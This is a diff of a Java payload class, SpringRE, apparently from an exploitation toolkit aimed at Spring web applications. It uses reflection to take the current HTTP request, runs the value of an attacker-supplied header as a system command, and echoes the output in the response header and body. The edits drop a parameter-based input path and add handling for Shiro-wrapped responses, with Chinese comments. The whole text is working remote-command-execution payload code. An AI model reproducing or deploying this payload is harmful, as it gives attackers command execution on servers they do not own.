@@ -16,12 +16,11 @@ import java.lang.reflect.Method;
  */
 @Middleware(Middleware.Spring)
 @JavaClassType(JavaClassType.Default)
-@JavaClassModifiable({JavaClassModifiable.HEADER, JavaClassModifiable.PARAM})
+@JavaClassModifiable({JavaClassModifiable.HEADER})
 public class SpringRE {
     public static String HEADER;
-    private static String PARAM;
 
-    static {
+    public SpringRE() {
         try {
             Class clazz = Thread.currentThread().getContextClassLoader().loadClass("org.springframework.web.context.request.RequestContextHolder");
             Object object = clazz.getMethod("getRequestAttributes").invoke(null);
@@ -29,18 +28,14 @@ public class SpringRE {
             Object request = invokeMethod(object, "getRequest", new Class[]{}, new Object[]{});
             Object response = invokeMethod(object, "getResponse", new Class[]{}, new Object[]{});
             Object header = invokeMethod(request, "getHeader", new Class[]{String.class}, new Object[]{HEADER});
-            Object parameter = invokeMethod(request, "getParameter", new Class[]{String.class}, new Object[]{PARAM});
+            String result = exec((String) header);
 
-            String str = null;
-            if (header != null) {
-                str = (String) header;
-            } else if (parameter != null) {
-                str = (String) parameter;
-            }
+            // 输出到头
+            invokeMethod(response, "addHeader", new Class[]{String.class, String.class}, new Object[]{HEADER, result});
 
-            String result = exec(str);
             invokeMethod(response, "setStatus", new Class[]{Integer.TYPE}, new Object[]{new Integer(200)});
-            Object writer = invokeMethod(response, "getWriter", new Class[]{}, new Object[]{});
+            // 有 shiro 情况不一样了
+            Object writer = invokeMethod(Class.forName("javax.servlet.ServletResponse"), response, "getWriter", new Class[]{}, new Object[]{});
             writer.getClass().getDeclaredMethod("println", String.class).invoke(writer, result);
             writer.getClass().getDeclaredMethod("flush").invoke(writer);
             writer.getClass().getDeclaredMethod("close").invoke(writer);
@@ -70,15 +65,18 @@ public class SpringRE {
         return stringBuilder.toString();
     }
 
-    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
-        Method method;
-        try {
-            method = obj.getClass().getDeclaredMethod(methodName, argsClass);
-        } catch (NoSuchMethodException e) {
-            method = obj.getClass().getSuperclass().getDeclaredMethod(methodName, argsClass);
-        }
+    public static Object invokeMethod(Class cls, Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception{
+        Method method = cls.getDeclaredMethod(methodName, argsClass);
         method.setAccessible(true);
         Object object = method.invoke(obj, args);
         return object;
+    }
+
+    public static Object invokeMethod(Object obj, String methodName, Class[] argsClass, Object[] args) throws Exception {
+        try {
+            return invokeMethod(obj.getClass(), obj, methodName, argsClass, args);
+        } catch (Exception e) {
+            return invokeMethod(obj.getClass().getSuperclass(), obj, methodName, argsClass, args);
+        }
     }
 }
